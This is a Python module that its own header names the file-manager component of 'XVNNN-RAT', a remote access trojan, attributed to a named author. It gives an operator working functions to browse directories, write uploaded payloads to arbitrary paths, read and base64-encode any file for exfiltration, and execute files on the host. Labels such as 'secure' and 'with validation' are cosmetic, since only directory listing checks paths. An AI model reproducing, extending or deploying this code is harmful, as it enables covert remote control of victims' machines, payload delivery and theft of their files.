"""
File manager module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import os
import base64
import platform
import subprocess
import logging
from utils.system import list_directory

logger = logging.getLogger(__name__)

class FileManagerModule:
    """Secure file management module"""
    
    def __init__(self):
        self.name = "filemanager"
        self.max_file_size = 10 * 1024 * 1024  # 10MB limit
        self.allowed_dirs = [
            os.getcwd(),
            os.path.expanduser('~'),
            '/tmp',
            'C:\\Users',
            'C:\\Temp'
        ]
    
    def list_files(self, path):
        """List files in directory with validation"""
        # Validate path
        if not path:
            path = os.getcwd()
        
        # Check if path is in allowed directories
        path_abs = os.path.abspath(path)
        allowed = False
        for allowed_dir in self.allowed_dirs:
            if path_abs.startswith(allowed_dir):
                allowed = True
                break
        
        if not allowed:
            return {'type': 'list_files', 'files': ['Access denied']}
        
        files = list_directory(path)
        return {'type': 'list_files', 'files': files}
    
    def upload_file(self, filename, data):
        """Upload file with size validation"""
        try:
            # Validate file size
            if len(data) > self.max_file_size:
                return {'type': 'upload', 'status': 'error: file too large'}
            
            # Decode and save
            file_data = base64.b64decode(data)
            
            # Create directory if needed
            directory = os.path.dirname(filename)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            
            with open(filename, 'wb') as f:
                f.write(file_data)
            
            return {'type': 'upload', 'status': 'success', 'filename': filename}
        except Exception as e:
            logger.error(f"Upload error: {e}")
            return {'type': 'upload', 'status': f'error: {str(e)}'}
    
    def download_file(self, filename):
        """Download file with validation"""
        try:
            # Validate file exists and size
            if not os.path.exists(filename):
                filename = os.path.join(os.getcwd(), filename)
            
            if not os.path.exists(filename):
                return {'type': 'download', 'error': 'File not found'}
            
            file_size = os.path.getsize(filename)
            if file_size > self.max_file_size:
                return {'type': 'download', 'error': 'File too large'}
            
            with open(filename, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            return {
                'type': 'download', 
                'data': file_data, 
                'filename': os.path.basename(filename),
                'size': file_size
            }
        except Exception as e:
            logger.error(f"Download error: {e}")
            return {'type': 'download', 'error': str(e)}
    
    def execute_file(self, filename):
        """Execute file with validation"""
        try:
            if platform.system() == 'Windows':
                os.startfile(filename)
            else:
                # On Linux, ensure file is executable
                subprocess.run(['chmod', '+x', filename])
                subprocess.Popen(['./' + filename])
            
            return {'type': 'execute', 'status': 'success'}
        except Exception as e:
            logger.error(f"Execute error: {e}")
            return {'type': 'execute', 'status': f'error: {str(e)}'}